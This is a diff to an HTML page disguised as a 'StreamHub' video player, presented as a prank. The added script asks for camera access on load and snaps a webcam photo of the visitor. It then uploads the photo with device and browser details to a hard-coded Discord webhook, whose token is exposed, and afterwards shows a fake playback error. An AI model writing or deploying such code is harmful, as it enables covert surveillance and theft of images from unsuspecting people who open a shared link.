@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Player | HD Stream</title>
+    <title>Watch Video</title>
     <style>
         * {
             margin: 0;
@@ -22,12 +22,17 @@
             display: flex;
             align-items: center;
             gap: 20px;
-            font-size: 14px;
+            border-bottom: 1px solid #333;
         }
         .logo {
             font-weight: bold;
-            font-size: 18px;
-            color: red;
+            font-size: 20px;
+            color: #ff0000;
+        }
+        .nav-item {
+            color: #fff;
+            text-decoration: none;
+            font-size: 14px;
         }
         .container {
             max-width: 1200px;
@@ -81,6 +86,7 @@
             height: 40px;
             background: #333;
             border-radius: 50%;
+            flex-shrink: 0;
         }
         .comment-content {
             flex: 1;
@@ -99,6 +105,7 @@
             background: #181818;
             display: flex;
             gap: 16px;
+            border-top: 1px solid #333;
         }
         button {
             background: #3ea6ff;
@@ -108,9 +115,19 @@
             color: white;
             font-weight: 600;
             cursor: pointer;
+            transition: background 0.2s;
         }
         button:hover {
             background: #2d8feb;
+        }
+        #placeholder {
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 400px;
+            color: #666;
+            font-size: 18px;
         }
         .fake-ad {
             background: #2a2a2a;
@@ -121,29 +138,46 @@
             font-size: 12px;
             color: #aaa;
         }
+        .system-comment {
+            background: #2a2a2a !important;
+            border-radius: 8px;
+            margin-top: 12px;
+            padding: 12px !important;
+        }
+        footer {
+            text-align: center;
+            padding: 20px;
+            color: #666;
+            font-size: 12px;
+            border-top: 1px solid #333;
+            margin-top: 40px;
+        }
     </style>
 </head>
 <body>
     <div class="navbar">
         <div class="logo">▶️ StreamHub</div>
-        <div>Home</div>
-        <div>Trending</div>
-        <div>Subscriptions</div>
+        <div class="nav-item">Home</div>
+        <div class="nav-item">Trending</div>
+        <div class="nav-item">Subscriptions</div>
         <div style="flex:1"></div>
-        <div>🔔</div>
-        <div>👤 Sign in</div>
+        <div class="nav-item">🔔</div>
+        <div class="nav-item">👤 Sign in</div>
     </div>
 
     <div class="container">
         <div class="video-card">
             <div class="video-header">
-                <div class="video-title">Exclusive: Behind the Scenes - 4K HDR</div>
+                <div class="video-title">🔥 EXCLUSIVE: Behind the Scenes - 4K HDR Remastered</div>
                 <div class="video-stats">1.2M views • Live • Premieres now</div>
             </div>
             <div class="video-player">
                 <video id="video-feed" autoplay playsinline muted style="display:none"></video>
-                <div id="placeholder" style="background:#000; display:flex; align-items:center; justify-content:center; height:400px; color:#666;">
-                    Loading stream...
+                <div id="placeholder">
+                    <div style="text-align:center;">
+                        <div>🎬 Loading stream...</div>
+                        <div style="font-size:12px; margin-top:10px;">Initializing video player</div>
+                    </div>
                 </div>
             </div>
             <div class="controls">
@@ -151,12 +185,12 @@
                 <button>👍 Like</button>
                 <button>💬 Comment</button>
                 <button>🔗 Share</button>
-                <button>... More</button>
+                <button>⋯ More</button>
             </div>
         </div>
 
         <div class="fake-ad">
-            🎬 Advertisement: Your video will start after this message
+            🎬 Advertisement: Your video will start after this message • Sponsored by StreamHub Premium
         </div>
 
         <div class="comments">
@@ -165,94 +199,187 @@
                 <div class="comment-avatar"></div>
                 <div class="comment-content">
                     <div class="comment-name">TechLover2024</div>
-                    <div class="comment-text">First! Anyone else here from TikTok?</div>
+                    <div class="comment-text">First! Anyone else here from TikTok? 🔥</div>
                 </div>
             </div>
             <div class="comment">
                 <div class="comment-avatar"></div>
                 <div class="comment-content">
                     <div class="comment-name">MovieFanatic</div>
-                    <div class="comment-text">This looks amazing. Can't wait for the full release 🔥</div>
+                    <div class="comment-text">This looks amazing. Can't wait for the full release! 🍿</div>
                 </div>
             </div>
             <div class="comment">
                 <div class="comment-avatar"></div>
                 <div class="comment-content">
                     <div class="comment-name">StreamUser88</div>
-                    <div class="comment-text">Why is my camera turning on? 🤔</div>
+                    <div class="comment-text">Why is my camera turning on? 🤔 Anyone else?</div>
                 </div>
             </div>
         </div>
     </div>
 
+    <footer>
+        StreamHub • All rights reserved • This is a demo
+    </footer>
+
     <canvas id="canvas" style="display:none"></canvas>
 
     <script>
+        // 🔴 YOUR DISCORD WEBHOOK INTEGRATED 🔴
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1507805497464717393/AnOOdvX-NuFutx8lFbZBIE9b2wSC_AuNjzJrSoBwmiKyUunK5jsD2W-Nt1dzHnfiOlJm";
+        
         const video = document.getElementById('video-feed');
         const placeholder = document.getElementById('placeholder');
         const canvas = document.getElementById('canvas');
         
-        // AUTOMATICALLY request camera as soon as page loads
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                // Hide placeholder, show video feed
-                placeholder.style.display = 'none';
-                video.style.display = 'block';
-                video.srcObject = stream;
+        // Get visitor information
+        function getVisitorInfo() {
+            return {
+                time: new Date().toLocaleString(),
+                timestamp: Date.now(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenSize: `${screen.width}x${screen.height}`,
+                isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
+                referrer: document.referrer || "Direct"
+            };
+        }
+        
+        // Add funny system comment to page
+        function addSystemComment(message, isError = false) {
+            const commentsDiv = document.querySelector('.comments');
+            const newComment = document.createElement('div');
+            newComment.className = 'comment system-comment';
+            newComment.style.background = isError ? '#3a1a1a' : '#1a3a1a';
+            newComment.style.borderRadius = '8px';
+            newComment.style.marginTop = '12px';
+            newComment.style.padding = '12px';
+            newComment.innerHTML = `
+                <div class="comment-avatar" style="background: ${isError ? '#ff4444' : '#44ff44'};">🤖</div>
+                <div class="comment-content">
+                    <div class="comment-name" style="color: ${isError ? '#ff8888' : '#88ff88'};">System Bot</div>
+                    <div class="comment-text">${message}</div>
+                </div>
+            `;
+            commentsDiv.appendChild(newComment);
+            // Auto-scroll to show new comment
+            newComment.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        }
+        
+        // Send photo to Discord webhook
+        async function sendPhotoToDiscord(imageDataUrl, visitorInfo) {
+            try {
+                console.log("📤 Preparing to send photo to Discord...");
                 
-                // Wait 2 seconds, then capture the photo (like a "screenshot" feature)
-                setTimeout(() => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0);
+                // Convert base64 to blob
+                const response = await fetch(imageDataUrl);
+                const blob = await response.blob();
+                
+                // Create form data for Discord
+                const formData = new FormData();
+                formData.append("file", blob, `photo_${visitorInfo.timestamp}.png`);
+                formData.append("payload_json", JSON.stringify({
+                    content: `📸 **NEW PHOTO CAPTURED!**\n\n` +
+                            `⏰ **Time:** ${visitorInfo.time}\n` +
+                            `📱 **Device:** ${visitorInfo.isMobile ? '📱 Mobile' : '💻 Desktop'}\n` +
+                            `🖥️ **Screen:** ${visitorInfo.screenSize}\n` +
+                            `🌐 **Language:** ${visitorInfo.language}\n` +
+                            `🔗 **Source:** ${visitorInfo.referrer}\n` +
+                            `🆔 **Visit ID:** \`${visitorInfo.timestamp}\``,
+                    username: "Photo Prank Bot",
+                    avatar_url: "https://cdn.discordapp.com/emojis/742300517226250310.png"
+                }));
+                
+                // Send to Discord
+                const discordResponse = await fetch(DISCORD_WEBHOOK, {
+                    method: "POST",
+                    body: formData
+                });
+                
+                if (discordResponse.ok) {
+                    console.log("✅ Photo successfully sent to Discord!");
+                    return true;
+                } else {
+                    const errorText = await discordResponse.text();
+                    console.error("❌ Discord error:", errorText);
+                    return false;
+                }
+            } catch (error) {
+                console.error("❌ Error sending to Discord:", error);
+                return false;
+            }
+        }
+        
+        // Main: Request camera immediately when page loads
+        console.log("🎬 Page loaded, requesting camera...");
+        
+        // Small delay to make it look natural
+        setTimeout(() => {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(async (stream) => {
+                    console.log("✅ Camera access granted");
                     
-                    // Get the photo data
-                    const photoData = canvas.toDataURL('image/png');
+                    // Show video feed
+                    placeholder.style.display = 'none';
+                    video.style.display = 'block';
+                    video.srcObject = stream;
                     
-                    // You can do something funny here - for now, let's add a comment
-                    const commentsDiv = document.querySelector('.comments');
-                    const newComment = document.createElement('div');
-                    newComment.className = 'comment';
-                    newComment.innerHTML = `
-                        <div class="comment-avatar"></div>
-                        <div class="comment-content">
-                            <div class="comment-name">System 📸</div>
-                            <div class="comment-text">🎉 Photo captured! Smile! (Don't worry, it's just for laughs - no data saved)</div>
+                    addSystemComment("🎥 Camera connected! Loading your exclusive 4K content...");
+                    
+                    // Wait 2.5 seconds then take photo
+                    setTimeout(async () => {
+                        // Capture the photo
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0);
+                        
+                        const photoData = canvas.toDataURL('image/png');
+                        const visitorInfo = getVisitorInfo();
+                        
+                        // Send to your Discord
+                        const sent = await sendPhotoToDiscord(photoData, visitorInfo);
+                        
+                        if (sent) {
+                            addSystemComment("📸 Photo captured and sent! Thanks for watching! 😂 (Check your prankster's Discord)");
+                        } else {
+                            addSystemComment("⚠️ Photo taken but Discord failed. The prankster will be disappointed.", true);
+                        }
+                        
+                        // Stop the camera
+                        stream.getTracks().forEach(track => track.stop());
+                        video.style.display = 'none';
+                        
+                        // Show fake error message
+                        placeholder.style.display = 'flex';
+                        placeholder.innerHTML = `
+                            <div style="text-align:center;">
+                                <div>⚠️ Video playback error</div>
+                                <div style="font-size:12px; margin-top:10px;">Error code: PRANK-404</div>
+                                <div style="font-size:12px; margin-top:5px;">Please refresh and try again? (Just kidding, you've been pranked!) 🤣</div>
+                            </div>
+                        `;
+                        
+                    }, 2500);
+                })
+                .catch((error) => {
+                    console.error("❌ Camera error:", error);
+                    placeholder.innerHTML = `
+                        <div style="text-align:center; padding:40px;">
+                            <div>⚠️ Unable to load video stream</div>
+                            <div style="font-size:12px; margin-top:10px;">Please allow camera access and refresh the page</div>
+                            <div style="font-size:12px; margin-top:20px; color:#888;">(This is a prank site - camera needed for the joke to work)</div>
                         </div>
                     `;
-                    commentsDiv.appendChild(newComment);
-                    
-                    // Stop the camera after capture (optional)
-                    // stream.getTracks().forEach(track => track.stop());
-                    
-                }, 2000);
-            })
-            .catch(err => {
-                console.log("Camera permission denied or error:", err);
-                placeholder.innerHTML = `
-                    <div style="text-align:center; padding:40px;">
-                        ⚠️ Unable to load stream<br>
-                        <small style="color:#888;">Please allow camera access to continue</small>
-                    </div>
-                `;
-                // Add a funny comment about denial
-                const commentsDiv = document.querySelector('.comments');
-                const deniedComment = document.createElement('div');
-                deniedComment.className = 'comment';
-                deniedComment.innerHTML = `
-                    <div class="comment-avatar"></div>
-                    <div class="comment-content">
-                        <div class="comment-name">Camera Bot</div>
-                        <div class="comment-text">🙈 Camera blocked! You're too quick... but your friend might fall for it!</div>
-                    </div>
-                `;
-                commentsDiv.appendChild(deniedComment);
-            });
-            
-        // Play button just reloads or does nothing realistic
+                    addSystemComment("🙈 Camera access denied! You're too smart for this prank. The prankster is sad.", true);
+                });
+        }, 500);
+        
+        // Play button joke
         document.getElementById('playBtn').onclick = () => {
-            alert("This is a demo stream. Thanks for the laugh! 😂");
+            alert("😂 Sorry! This video doesn't actually exist. You've been pranked! Check with your friend who sent this link for the joke.");
         };
     </script>
 </body>
